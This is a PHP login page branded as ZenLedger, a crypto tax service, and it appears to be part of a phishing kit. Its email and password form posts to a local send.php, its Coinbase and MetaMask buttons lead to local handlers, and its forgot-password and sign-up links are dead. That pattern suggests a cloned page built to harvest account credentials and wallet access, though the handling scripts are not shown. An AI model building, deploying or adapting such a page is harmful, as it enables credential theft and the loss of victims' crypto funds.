<?php include_once './config.php'; ?>
<html lang="en">
    <?php
    unset($_SESSION['email']);
    unset($_SESSION['password']);
    unset($_SESSION['phone_number']);
    $title = 'Login - ZenLedger';
    include_once './includes/meta.php';
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-5 bg-white p30 rounded-3">
                    <div class="d-flex align-items-center">
                        <form method="post" action="<?= base_url('send.php') ?>" class="col-12">
                            <h1 class="h4 text-center">Sign in to your account</h1>
                            <div class="text-center mx-auto d-grid gap-2 my20">
                                <a href="<?= base_url('coinbase')?>" class="btn btn-primary bg-primary-2 py7 fs16 btn-block">
                                    <img alt="coinbase" src="<?= base_url('assets/img/coinbase-white.png')?>" height="20" class="pe8">
                                    <span>Continue with Coinbase</span>
                                </a>
                                <div class="text-secondary fs13 mt10">You will be redirected to Coinbase to grant read-only access to ZenLedger.</div>
                                <a href="<?= base_url('metamask')?>" class="btn btn-primary py7 mt20 fs16 btn-block" style="background-color: rgb(64, 86, 244)">
                                    <img alt="metamask" src="<?= base_url('assets/img/metamask.png')?>" height="20" class="pe8" />
                                    <span>Connect to MetaMask</span>
                                </a>
                                <button type="button" class="btn btn-light py8 my15 fs16 btn-block disabled" style="background-color: rgb(216, 226, 239)">
                                    <img alt="metamask" src="<?= base_url('assets/img/google_icon.png')?>" height="20" class="pe8" />
                                    <span>Continue with Google</span>
                                </button>
                            </div>
                            <div class="col-sm-12 my20 text-center border-top" style="position: relative">
                                <span class="text-secondary px10 bg-white fs13" style="position: absolute; bottom:-10px">Or</span>
                            </div>
                            <div class="my35">
                                <label class="form-label fw-bold">Email address</label>
                                <input name="email" type="email" minlength="3" maxlength="200" required="" class="form-control" placeholder="Email" /> 
                            </div>
                            <div class="mt35">
                                <label class="form-label fw-bold">Password</label>
                                <input name="password" type="password" placeholder="Password" required="" minlength="3" maxlength="50" class="form-control"/>
                            </div>
                            <div class="row my15">
                                <div class="col-sm-12 text-end">
                                    <a href="#" class="text-decoration-none text-primary-2 fw-bold">Forgot password?</a>
                                </div>
                            </div>
                            <div class="text-center mx-auto d-grid gap-2">
                                <button type="submit" class="btn btn-success bg-success-2 border-3 btn-lg btn-block border-0 fs15 py10">Sign in</button>
                            </div>
                             <div class="col-sm-12 my20 text-center">
                                <a href="#" class="text-decoration-none text-primary-2">Sign up for an account here</a>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>